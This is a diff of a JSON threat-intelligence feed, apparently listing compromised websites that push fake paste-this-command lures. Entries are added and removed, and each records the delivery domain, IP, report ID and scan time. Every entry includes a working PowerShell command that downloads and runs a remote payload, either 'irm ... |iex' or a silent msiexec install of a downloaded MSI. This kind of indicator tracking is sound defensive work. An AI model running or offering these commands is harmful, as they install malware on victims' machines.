@@ -1,5 +1,69 @@
 [
   {
+    "UrlDomain": "www.mediweld.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.52"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/5f16a861fec93d5c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29910323",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/5f16a861fec93d5c"
+    ],
+    "ReportId": "cmwfq2sdt0iq70omlfqlpffxx",
+    "ScannedAt": "2026-11-14T01:23:57.427000+00:00"
+  },
+  {
+    "UrlDomain": "kirketerpthaarup.dk",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "46.30.213.96"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwfpywm20ikw0omloshmzs1c",
+    "ScannedAt": "2026-11-14T01:20:56.286000+00:00"
+  },
+  {
+    "UrlDomain": "20wawo30.com",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "IP": [
+      "153.127.54.82"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "ReportId": "cmwfpwgss0ihy0omlygayvwid",
+    "ScannedAt": "2026-11-14T01:19:02.441000+00:00"
+  },
+  {
     "UrlDomain": "update.sportela.bg",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -666,142 +730,5 @@
     ],
     "ReportId": "cmwebebjc0c1o0oml57p74iht",
     "ScannedAt": "2026-11-13T01:45:15.056000+00:00"
-  },
-  {
-    "UrlDomain": "www.w-z-o.org",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "5.134.12.33"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/f141a3fc3b742e21",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/f141a3fc3b742e21'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/f141a3fc3b742e21"
-    ],
-    "ReportId": "cmwean10w0btt0omla09v8y3l",
-    "ScannedAt": "2026-11-13T01:24:01.621000+00:00"
-  },
-  {
-    "UrlDomain": "auximetal.es",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "217.160.0.233"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/b588d19d7447a34f",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=ccb41636296169d7f3694c14278c71af6279af9c3e8d68ea&amp;_v=29908882",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/b588d19d7447a34f'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/b588d19d7447a34f"
-    ],
-    "ReportId": "cmweam9ea0bq60omlc6wn3tdt",
-    "ScannedAt": "2026-11-13T01:23:25.880000+00:00"
-  },
-  {
-    "UrlDomain": "agdaghafriyat.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "94.138.202.100"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/517644a705a49caa",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29908882",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29908882",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/517644a705a49caa'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/517644a705a49caa"
-    ],
-    "ReportId": "cmweam8mu0bq30oml9mwud97d",
-    "ScannedAt": "2026-11-13T01:23:24.624000+00:00"
-  },
-  {
-    "UrlDomain": "www.cinepassionmeyzieu.com",
-    "DeliveryUrl": [
-      "rosrefurboss.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x",
-      "https://platform.twitter.com/jot.html"
-    ],
-    "IP": [
-      "109.234.162.44"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmweaigu40bil0omlfmyycqdj",
-    "ScannedAt": "2026-11-13T01:20:28.910000+00:00"
-  },
-  {
-    "UrlDomain": "expertlightinginc.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "68.178.190.139"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwea9wm70b9q0oml4v5kca0d",
-    "ScannedAt": "2026-11-13T01:13:49.446000+00:00"
-  },
-  {
-    "UrlDomain": "467media.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "107.180.2.62"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwea5lgf0b6n0omlk8sgo9nq",
-    "ScannedAt": "2026-11-13T01:10:28.381000+00:00"
   }
 ]
